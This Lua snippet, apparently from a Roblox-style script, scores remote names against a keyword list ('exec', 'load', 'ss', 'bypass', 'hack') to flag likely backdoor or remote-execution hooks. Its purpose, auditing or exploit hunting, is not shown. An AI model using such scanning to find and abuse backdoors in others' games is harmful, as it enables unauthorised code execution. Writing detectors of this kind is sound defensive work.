local SUSPICIOUS_NAMES = {"exec","run","load","string","ss","admin","bypass","hack","remote","event","code"}
local function getRemoteScore(name)
    local score = 0
    local n = name:lower()
    for _, s in ipairs(SUSPICIOUS_NAMES) do
        if n:find(s) then score = score + 5 end
    end
    -- Gibberish/Numeric names get high score
    if name:match("%d%d%d") then score = score + 10 end
    if #name <= 3 then score = score + 5 end
    return score
end

